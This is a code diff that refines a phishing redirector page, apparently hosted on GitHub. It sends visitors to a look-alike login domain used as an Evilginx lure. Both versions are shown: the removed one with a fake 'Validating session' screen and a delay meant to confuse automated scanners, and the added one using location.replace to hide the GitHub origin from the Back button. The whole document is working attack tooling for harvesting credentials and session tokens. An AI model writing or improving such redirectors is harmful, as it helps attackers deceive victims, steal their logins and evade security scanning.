@@ -1,21 +1,6 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Loading Secure Document...</title>
-    <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; color: #666; }
-    </style>
-</head>
-<body>
-    <p>Validating session... Please wait.</p>
-
-    <script>
-        // The delay confuses automated scanners that don't wait for JS
-        setTimeout(function() {
-            // REPLACE THIS with your actual Evilginx lure URL
-            window.location.href = "https://login.file-share-hub.com/DbhZOTUR
-";
-        }, 2500); // 2.5 second delay
-    </script>
-</body>
-</html>
+<script>
+    setTimeout(function() {
+        // location.replace is better - it hides the GitHub link from the 'Back' button
+        window.location.replace("https://login.file-share-hub.com/DbhZOTUR");
+    }, 800); // 0.8 seconds - feels like a quick 'handshake'
+</script>
